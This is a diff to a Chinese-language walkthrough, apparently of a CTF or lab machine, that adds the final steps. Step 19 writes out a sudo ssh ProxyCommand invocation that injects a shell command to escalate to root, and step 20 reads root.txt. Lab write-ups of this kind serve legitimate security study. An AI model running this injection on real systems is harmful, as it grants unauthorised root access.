@@ -82,4 +82,12 @@
 
 ![圖片](https://github.com/favorite986141/jamescao/assets/125249893/1aa189e9-4cf6-4c3a-a9e2-62c70a61938e)
 
-19.到[gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo)
+19.到[gtfobins](https://gtfobins.github.io/gtfobins/ssh/#sudo)找到指令提權
+
+     sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/c1fd6925-0dcd-453f-a184-fb372a7d1e1a)
+
+20.找到root.txt
+
+![圖片](https://github.com/favorite986141/jamescao/assets/125249893/1db3328f-75e6-4f8e-92ef-f9a0b83b34ef)
